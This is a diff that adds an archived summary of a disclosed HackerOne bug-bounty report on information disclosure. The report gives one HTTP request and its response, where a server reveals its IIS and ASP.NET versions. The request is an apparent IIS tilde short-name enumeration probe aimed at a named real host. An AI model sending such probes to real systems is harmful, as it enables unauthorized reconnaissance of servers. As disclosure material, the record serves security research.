@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/148777
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/linkks
+ReportedTo:Maximum(maximum)
+BountyAmount:20.0
+Severity:
+State:Closed
+DateOfDisclosure:31.03.2017 2:17:39
+
+Summary:
+
+Request
+OPTIONS //*~1*/a.aspx?aspxerrorpath=/ HTTP/1.1
+Host: exactrd.maximum.nl
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
+Accept: */*
+
+Response
+HTTP/1.1 404 Not Found
+Content-Type: text/html
+Server: Microsoft-IIS/8.0
+X-Powered-By: ASP.NET
+Date: Sat, 02 Jul 2016 00:35:22 GMT
+Content-Length: 1245
